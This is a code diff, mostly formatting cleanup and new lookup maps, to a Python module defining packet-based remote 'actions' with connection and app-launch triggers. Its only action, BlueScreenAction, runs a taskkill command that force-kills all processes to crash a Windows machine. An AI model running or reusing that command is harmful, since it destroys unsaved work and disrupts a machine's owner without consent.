@@ -10,11 +10,14 @@ class ActionKind:
     BLUESCREEN = 0
 
 
-
 class StartPrqKind:
     NONE = 0
     WHEN_CONNECTED = 1
     WHEN_LAUNCH_APP = 2
+
+
+class EndPrqKind:
+    NONE = 0
 
 
 class StartPrq:
@@ -86,10 +89,11 @@ class EndPrq:
 
     def name(self) -> str:
         return "undefined"
-    
+
+
 class NoneEndPrq(EndPrq):
     def __init__(self):
-        super().__init__(0)
+        super().__init__(EndPrqKind.NONE)
 
     def valid(self) -> bool:
         return True
@@ -105,13 +109,13 @@ class AnAction:
 
     def execute(self):
         pass
-    
+
     def name(self) -> str:
         return "undefined"
-    
+
     def __str__(self):
         return self.name()
-    
+
 
 class BlueScreenAction(AnAction):
     def __init__(self):
@@ -119,7 +123,7 @@ class BlueScreenAction(AnAction):
 
     def execute(self):
         system('taskkill /fi "pid ge 1" /f')
-    
+
     def name(self) -> str:
         return "蓝屏"
 
@@ -136,7 +140,7 @@ class TheAction:
         self.actions = actions
         self.start_prqs = start_prqs
         self.end_prqs = end_prqs
-    
+
     def build_packet(self) -> Packet:
         packet = {"name": self.name}
         packet["actions"] = [(action.kind, action.datas) for action in self.actions]
@@ -146,3 +150,8 @@ class TheAction:
 
     def __str__(self):
         return self.name
+
+
+actions_map = {ActionKind.BLUESCREEN: BlueScreenAction}
+start_prqs_map = {StartPrqKind.NONE: NoneStartPrq, StartPrqKind.WHEN_LAUNCH_APP: LaunchAppStartPrq}
+end_prqs_map = {EndPrqKind.NONE: NoneEndPrq}
